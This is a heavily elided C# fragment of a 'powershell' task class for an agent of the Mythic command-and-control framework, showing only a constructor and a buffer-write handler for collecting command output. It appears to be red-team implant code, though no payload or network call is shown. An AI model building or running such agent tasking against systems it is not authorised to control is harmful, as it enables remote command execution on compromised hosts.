...
namespace Tasks
{
    public class powershell : Tasking
    {
        ...
        public powershell(IAgent agent, SystemInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
            _flushMessages = () =>
            {
                string output = "";
        ...
        private void OnBufferWrite(object sender, SystemInterop.Classes.Events.StringDataEventArgs e)
        {
            if(e.Data != null)
            {
                try
